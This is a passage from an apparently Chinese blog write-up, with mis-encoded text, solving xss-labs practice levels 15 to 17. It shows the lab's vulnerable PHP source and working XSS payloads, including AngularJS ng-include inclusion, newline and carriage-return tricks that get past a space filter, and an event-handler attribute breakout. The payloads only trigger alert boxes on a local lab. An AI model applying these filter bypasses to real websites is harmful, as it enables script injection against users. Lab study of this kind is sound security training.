href="#å°ç»“-13" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬å…³æœåŠ¡ç«¯è¯»å–å›¾ç‰‡çš„exifä¿¡æ¯å¹¶å›æ˜¾åˆ°é¡µé¢ï¼Œxssæ”»å‡»çš„æ€è·¯å°±æ˜¯åœ¨exifä¿¡æ¯ä¸­æ’å…¥jsä»£ç ï¼Œå½“åç«¯å›æ˜¾åˆ°é¡µé¢æ—¶è§¦å‘æ‰§è¡Œã€‚</p><h1 id="åäº”ã€level-15-ï¼ˆangular-ng-include-åŒ…å«xssæ”»å‡»ï¼‰"><a href="#åäº”ã€level-15-ï¼ˆangular-ng-include-åŒ…å«xssæ”»å‡»ï¼‰" class="headerlink" title="åäº”ã€level-15***ï¼ˆangular ng-include åŒ…å«xssæ”»å‡»ï¼‰"></a>åäº”ã€level-15***ï¼ˆangular ng-include åŒ…å«xssæ”»å‡»ï¼‰</h1><h2 id="15-1-é¢˜é¢"><a href="#15-1-é¢˜é¢" class="headerlink" title="15.1 é¢˜é¢"></a>15.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.05.42.png" style="zoom:50%;"><h2 id="15-2-è§£é¢˜"><a href="#15-2-è§£é¢˜" class="headerlink" title="15.2 è§£é¢˜"></a>15.2 è§£é¢˜</h2><ul><li>æ•°æ®æäº¤ä¸å›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.08.22.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.08.48.png" style="zoom:50%;"><p>æäº¤çš„GETå‚æ•°aaaä¼šå‡ºç°åœ¨spanæ ‡ç­¾çš„classå±æ€§ä¸­ã€‚</p><ul><li>POCæ¢æµ‹</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.12.07.png" style="zoom:50%;"><p>1ï¼‰å·¦å³å°–æ‹¬å·è¢«ç¼–ç </p><p>2ï¼‰åŒå¼•å·è¢«ç¼–ç </p><p>å¾ˆåƒæ˜¯ä½¿ç”¨äº†å‡½æ•°ã€‚</p><h2 id="15-2-ä»£ç å®¡è®¡"><a href="#15-2-ä»£ç å®¡è®¡" class="headerlink" title="15.2 ä»£ç å®¡è®¡"></a>15.2 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆçš„ä¸é”™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level16.php?keyword=test"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°ç¬¬15å…³ï¼Œè‡ªå·±æƒ³ä¸ªåŠæ³•èµ°å‡ºå»å§ï¼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level15.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;body&gt;&lt;span class="ng-include:'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¡®å®ä½¿ç”¨äº†htmlspecialcharså‡½æ•°ã€‚</p><p>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</p><h2 id="15-3-å¤–æ´"><a href="#15-3-å¤–æ´" class="headerlink" title="15.3 å¤–æ´"></a>15.3 å¤–æ´</h2><p>æ³¨æ„åˆ°åœ¨headä¸­åŒ…å«äº†ä¸€ä¸ªåä¸ºâ€angular.min.jsâ€çš„æ–‡ä»¶ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.19.16.png" style="zoom:50%;"><p>è¿™ä¸ªjsæ–‡ä»¶å¹²å˜›çš„ï¼Ÿ</p><blockquote><p><code>angular.min.js</code> æ˜¯ Angular æ¡†æ¶çš„ä¸€ä¸ªå‹ç¼©ç‰ˆæœ¬æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å‡å°‘æ–‡ä»¶å¤§å°å’Œæé«˜åŠ è½½é€Ÿåº¦ã€‚Angular æ˜¯ä¸€ä¸ªæµè¡Œçš„å‰ç«¯ JavaScript æ¡†æ¶ï¼Œç”± Google ç»´æŠ¤ï¼Œç”¨äºæ„å»ºåŠ¨æ€çš„å•é¡µåº”ç”¨ç¨‹åºï¼ˆSPAï¼‰ã€‚</p><p><code>ng-include</code> æ˜¯ AngularJS æ¡†æ¶ä¸­çš„ä¸€ä¸ªæŒ‡ä»¤ï¼ˆDirectiveï¼‰ï¼Œå®ƒç”¨äºåŠ¨æ€åœ°å°†å¤–éƒ¨ HTML æ–‡ä»¶çš„å†…å®¹åŒ…å«ï¼ˆåµŒå…¥ï¼‰åˆ°å½“å‰çš„è§†å›¾ï¼ˆViewï¼‰ä¸­ã€‚è¿™åœ¨æ„å»ºå¤§å‹åº”ç”¨ç¨‹åºæ—¶éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå…è®¸å¼€å‘è€…å°†é¡µé¢åˆ†è§£æˆæ›´å°ã€æ›´æ˜“äºç®¡ç†çš„ç»„ä»¶ã€‚</p><p>é€šè¿‡ä½¿ç”¨ng-includeï¼Œå¯ä»¥å°†å¤–éƒ¨HTMLæ–‡ä»¶çš„å†…å®¹åŠ¨æ€åœ°æ’å…¥åˆ°å½“å‰çš„HTMLé¡µé¢ä¸­ã€‚</p><p>ä»¥ä¸‹æ˜¯ng-includeçš„åŸºæœ¬ç”¨æ³•ï¼š</p><p>åœ¨éœ€è¦åŒ…å«å¤–éƒ¨æ–‡ä»¶çš„ä½ç½®ï¼Œä½¿ç”¨ng-includeæŒ‡ä»¤ï¼Œå¹¶å°†è¦åŒ…å«çš„æ–‡ä»¶è·¯å¾„èµ‹å€¼ç»™æŒ‡ä»¤çš„å±æ€§å€¼ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-include</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>path/to/file.html'<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>æˆ‘ä»¬çŸ¥é“äº†<code>ng-include</code> æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«æŒ‡ä»¤ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è®©å½“å‰ç½‘é¡µåŒ…å«ä¸€ä¸ªæœ‰xssæ¼æ´çš„é¡µé¢ï¼Œæ¯”å¦‚<code>level1.php</code>ï¼Œç„¶åæäº¤nameå‚æ•°è§¦å‘æ‰§è¡Œã€‚</p><p>Try1:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'level1.php?name=&lt;script&gt;alert('</span>xss<span class="token string">')&lt;/script&gt;'</span><span class="token string">'level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;'</span><span class="token string">'level1.php?name=&lt;a href=x onerror=alert(1) &gt;'</span> <span class="token comment">//aæ ‡ç­¾ä¸æ˜¯è‡ªé—­åˆæ ‡ç­¾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.33.05.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.38.14.png" style="zoom:50%;"><p>Try2:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'level1.php?name=&lt;img src=x onerror=alert(1)&gt;'</span><span class="token string">'level1.php?name=&lt;img src=x onerror=alert(12) &gt;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.35.47.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.36.32.png" style="zoom:50%;"><p>æˆåŠŸè§¦å‘xssä»£ç æ‰§è¡Œã€‚</p><h2 id="é—®é¢˜æ·±ç©¶"><a href="#é—®é¢˜æ·±ç©¶" class="headerlink" title="é—®é¢˜æ·±ç©¶"></a>é—®é¢˜æ·±ç©¶</h2><p>ä¸ºä»€ä¹ˆTry1ä¸å¯ä»¥ï¼ŒTry2å¯ä»¥ï¼Ÿåªèƒ½ç”¨è‡ªé—­åˆçš„æ ‡ç­¾ï¼Ÿ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'level1.php?name=&lt;source src=x onerror=alert(1)&gt;'</span>  <span class="token comment">//å¤±è´¥</span><span class="token operator">&lt;</span>video<span class="token operator">&gt;</span><span class="token string single-quoted-string">'level1.php?name=&lt;video src=x onerror=alert(1)&gt;'</span> <span class="token comment">//æˆåŠŸ</span><span class="token string single-quoted-string">'level1.php?name=&lt;audio src=x onerror=alert(1)&gt;'</span> <span class="token comment">//æˆåŠŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰srcå±æ€§çš„è‡ªé—­åˆæ ‡ç­¾æœ‰å“ªäº›ï¼Ÿ</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.55.40.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2016.57.14.png" style="zoom:50%;"><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>angular ng-include åŒ…å«xssæ”»å‡»ã€‚</p><p>æ³¨æ„imgã€videoã€audioç­‰è‡ªé—­åˆçš„èµ„æºç±»æ ‡ç­¾çš„ä½¿ç”¨ã€‚</p><h1 id="åå…­ã€level-16-ï¼ˆ-0aã€-0dã€-0a-0då’Œ-0d-0aç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼‰"><a href="#åå…­ã€level-16-ï¼ˆ-0aã€-0dã€-0a-0då’Œ-0d-0aç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼‰" class="headerlink" title="åå…­ã€level-16**ï¼ˆ%0aã€%0dã€%0a%0då’Œ%0d%0aç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼‰"></a>åå…­ã€level-16**ï¼ˆ<code>%0a</code>ã€<code>%0d</code>ã€<code>%0a%0d</code>å’Œ<code>%0d%0a</code>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼‰</h1><h2 id="16-1-é¢˜é¢"><a href="#16-1-é¢˜é¢" class="headerlink" title="16.1 é¢˜é¢"></a>16.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.02.57.png" style="zoom:40%;"><h2 id="16-2-è§£é¢˜"><a href="#16-2-è§£é¢˜" class="headerlink" title="16.2 è§£é¢˜"></a>16.2 è§£é¢˜</h2><ul><li>æ¢æµ‹æ•°æ®æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.05.19.png" style="zoom:67%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.06.11.png" style="zoom:50%;"><p>é€šè¿‡keywordå‚æ•°æäº¤æ•°æ®ï¼Œåœ¨centeræ ‡ç­¾ä¸­å›æ˜¾ã€‚</p><ul><li>POCæµ‹è¯•</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.07.41.png" style="zoom:50%;"><p>1ï¼‰è½¬åŒ–ä¸ºäº†å°å†™</p><p>2ï¼‰å°†scriptè½¬åŒ–ä¸ºäº†ç©ºæ ¼</p><p>3ï¼‰å°†ç©ºæ ¼ç¼–ç ä¸ºäº†<code>&amp;nbsp;</code></p><p>4ï¼‰æ²¡æœ‰ç¼–ç onï¼Œå•å¼•å·ï¼ŒåŒå¼•å·ï¼Œå·¦å³å°–æ‹¬å·</p><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span>x<span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.12.35.png" style="zoom:50%;"><p>ç”¨<code>/</code>æ›¿æ¢ç©ºæ ¼è²Œä¼¼è¡Œä¸é€šã€‚</p><h2 id="16-3-ä»£ç å®¡è®¡"><a href="#16-3-ä»£ç å®¡è®¡" class="headerlink" title="16.3 ä»£ç å®¡è®¡"></a>16.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;center&gt;"</span><span class="token operator">.</span><span class="token variable">$str5</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/center&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå…ˆè½¬åŒ–ä¸ºäº†å°å†™ï¼Œç„¶åå°†<code>script</code>æ›¿æ¢ä¸º<code>&amp;nbsp;</code>ï¼Œå°†ç©ºæ ¼æ›¿æ¢ä¸º<code>&amp;nbsp;</code>,å°†æ­£æ–œæ æ›¿æ¢ä¸º<code>&amp;nbsp;</code>ï¼Œæœ€ååœ¨è®²ç©ºæ ¼æ›¿æ¢ä¸º<code>&amp;nbsp;</code>ã€‚</p><h2 id="16-4-ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#16-4-ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="16.4 ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>16.4 ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h2><p>é™¤äº†æ­£æ–œæ <code>/</code>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤å¤–ã€‚ä¸‹é¢çš„ç¬¦å·ä¹Ÿå¯ä»¥ç”¨äºç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æ¢è¡Œç¬¦ï¼ˆLFï¼‰ï¼š%0aåˆ¶è¡¨ç¬¦ï¼ˆHTï¼‰ï¼š%09å›è½¦ç¬¦ï¼ˆCRï¼‰ï¼š%0d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.30.12.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.26.19.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.28.15.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.29.16.png" style="zoom:50%;"><p>ç»è¿‡æµ‹è¯•æœ¬å…³<code>%0a</code>ã€<code>%0d</code>ã€<code>%0a%0d</code>å’Œ<code>%0d%0a</code>å‡å¯ä»¥ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚</p><h2 id="å°ç»“-14"><a href="#å°ç»“-14" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬å…³ä¸»è¦è€ƒå¯Ÿxssä¸­ç©ºæ ¼è¿‡æ»¤çš„ç»•è¿‡ã€‚</p><h1 id="åä¸ƒã€level-17ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰"><a href="#åä¸ƒã€level-17ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰" class="headerlink" title="åä¸ƒã€level-17ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰"></a>åä¸ƒã€level-17ï¼ˆäº‹ä»¶å±æ€§é—­åˆç»•è¿‡ï¼‰</h1><h2 id="17-1-é¢˜é¢"><a href="#17-1-é¢˜é¢" class="headerlink" title="17.1 é¢˜é¢"></a>17.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.36.22.png" style="zoom:50%;"><p>æ˜¯çš„ï¼ŒFlashæ’ä»¶å·²ç»åŸºæœ¬é€€å‡ºå†å²èˆå°ã€‚Adobeå…¬å¸åœ¨2020å¹´12æœˆ31æ—¥æ­£å¼åœæ­¢äº†å¯¹Flashçš„æ”¯æŒï¼Œå¹¶ä¸”ä»2021å¹´1æœˆ12æ—¥èµ·ï¼ŒFlashå†…å®¹æ— æ³•å†æ­£å¸¸è¿è¡Œã€‚ä¸»æµæµè§ˆå™¨å¦‚Chromeã€Firefoxå’ŒEdgeç­‰ä¹Ÿéƒ½åœ¨2020å¹´åº•æˆ–2021å¹´åˆåœæ­¢äº†å¯¹Flashçš„æ”¯æŒã€‚å°½ç®¡å¦‚æ­¤ï¼Œä»æœ‰éƒ¨åˆ†ç”¨æˆ·å› ç‰¹å®šéœ€æ±‚åœ¨ä½¿ç”¨ä¸€äº›ç‰¹æ®Šç‰ˆæœ¬æˆ–æ›¿ä»£æ–¹æ¡ˆæ¥ç»§ç»­è¿è¡ŒFlashå†…å®¹ï¼Œä½†è¿™äº›æ–¹æ³•å­˜åœ¨å®‰å…¨é£é™©ï¼Œä¸”Flashçš„ä½¿ç”¨åœºæ™¯å·²ç»å¤§å¹…å‡å°‘ã€‚</p><h2 id="17-2-è§£é¢˜"><a href="#17-2-è§£é¢˜" class="headerlink" title="17.2 è§£é¢˜"></a>17.2 è§£é¢˜</h2><ul><li>æ¢æµ‹æ•°æ®æäº¤ä¸å›æ˜¾</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.8/xss-labs/level17.php?arg01<span class="token operator">=</span>aaaa<span class="token operator">&amp;</span><span class="token assign-left variable">arg02</span><span class="token operator">=</span>bbbb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.38.53.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.39.20.png" style="zoom:50%;"><p>è§‚å¯Ÿbbbçš„å›æ˜¾ä½ç½®ï¼Œå¯ä»¥è€ƒè™‘é—­åˆsrcå±æ€§ã€‚</p><blockquote><h4 id="embedæ ‡ç­¾"><a href="#embedæ ‡ç­¾" class="headerlink" title="embedæ ‡ç­¾"></a>embedæ ‡ç­¾</h4><p><code>&lt;embed&gt;</code>æ ‡ç­¾ç”¨äºåœ¨HTMLæ–‡æ¡£ä¸­åµŒå…¥å¤–éƒ¨å†…å®¹ï¼Œå¦‚å¤šåª’ä½“æ–‡ä»¶ã€PDFæ–‡æ¡£ã€FlashåŠ¨ç”»ç­‰ã€‚ä¸è¿‡ï¼Œç”±äºå¤§å¤šæ•°ç°ä»£æµè§ˆå™¨å·²ç»å¼ƒç”¨å¹¶ç§»é™¤äº†å¯¹æ’ä»¶çš„æ”¯æŒï¼Œå› æ­¤<code>&lt;embed&gt;</code>æ ‡ç­¾çš„ä½¿ç”¨åœºæ™¯å·²ç»å¤§å¹…å‡å°‘ã€‚</p><p><code>&lt;embed&gt;</code>æ ‡ç­¾çš„å±æ€§</p><ul><li>**<code>src</code>**ï¼šæŒ‡å®šè¦åµŒå…¥çš„å¤–éƒ¨æ–‡ä»¶çš„URLã€‚</li><li>**<code>type</code>**ï¼šæŒ‡å®šåµŒå…¥å†…å®¹çš„MIMEç±»å‹ã€‚</li><li>widthå’Œheightï¼šåˆ†åˆ«æŒ‡å®šåµŒå…¥å†…å®¹çš„å®½åº¦å’Œé«˜åº¦ï¼Œå•ä½ä¸ºCSSåƒç´ ã€‚</li></ul></blockquote><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">bbbb<span class="token string">" onmouseover=alert(1) "</span>æˆ–bbbb onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.43.33.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2017.43.57.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><h2 id="17-3-ä»£ç å®¡è®¡"><a href="#17-3-ä»£ç å®¡è®¡" class="headerlink" title="17.3 ä»£ç å®¡è®¡"></a>17.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;embed src=xsf01.swf?"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"arg01"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"="</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"arg02"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" width=100% heigth=100%&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>SWFï¼ˆShockwave Flashï¼‰æ–‡ä»¶æ˜¯ä¸€ç§ç”¨äºåœ¨ç½‘é¡µä¸ŠåµŒå…¥å¤šåª’ä½“å†…å®¹çš„æ–‡ä»¶æ ¼å¼ï¼Œé€šå¸¸ç”¨äºåŠ¨ç”»ã€è§†é¢‘ã€äº¤äº’å¼åº”ç”¨ç¨‹åºç­‰ã€‚SWFæ–‡ä»¶æ˜¯ç”±Adobe 